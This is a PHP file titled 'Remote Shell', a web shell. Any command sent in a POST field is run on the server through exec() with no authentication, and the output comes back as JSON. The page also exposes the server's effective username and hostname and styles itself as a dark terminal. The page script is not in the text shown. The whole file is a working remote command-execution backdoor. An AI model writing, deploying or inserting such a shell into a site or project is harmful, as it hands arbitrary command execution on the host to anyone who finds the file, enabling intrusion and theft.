<?php
if (isset($_POST['command'])) {
    header('Content-Type: application/json');

    $command = trim($_POST['command']);
    $json['status'] = 0;

    if ($command != '') {
        exec("$command 2>&1", $output, $json['status']);
        $json['output'] = PHP_EOL . join(PHP_EOL, $output) . PHP_EOL;
    }

    die(json_encode($json));
}
?>
<!doctype html>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Remote Shell</title>
<style>
    html, body, input {
        margin: 0;
        padding: 0;
        background-color: #222222;
    }
    html, body, input, .dir:before, .dir:after {
        color: #dddddd;
    }
    div#output, input {
        font-family: "Consolas", "Menlo", monospace;
    }
    div#output {
        margin: 1em;
        white-space: pre;
        line-height: 1.1em;
    }
    input {
        width: 500px;
        font-size: .98em;
    }
    input, input:active, input:focus, input:enabled, input:-webkit-autofill:active,
    input:-webkit-autofill:focus, input:-webkit-autofill:enabled, input:-webkit-autofill {
        background-color: #222222;
        color: #dddddd;
        border: none;
        outline: none;
        -webkit-box-shadow: 0 0 0 30px #222222 inset;
        -webkit-text-fill-color: #dddddd !important;
    }
    .dir, .prompt {
        font-weight: 600;
    }
    .prompt {
        color: #00ff00;
    }
    .dir {
        color: #4284F4;
    }
    .dir:before {
        content: ':';
    }
    .dir:after {
        content: '$ ';
    }
    .hide {
        display: none;
    }
    #overlay {
        position: fixed;
        top: 0;
        left: 0;
        visibility: hidden;
        overflow: auto;
        box-sizing: border-box;
        width: 100%;
        height: 100%;
        background-color: #dddddd;
    }
</style>

<span id="username" class="hide"><?= posix_getpwuid(posix_geteuid())['name'] ?></span>
<span id="hostname" class="hide"><?= gethostname() ?></span>

<div id="output"></div>
<div id="overlay"></div>
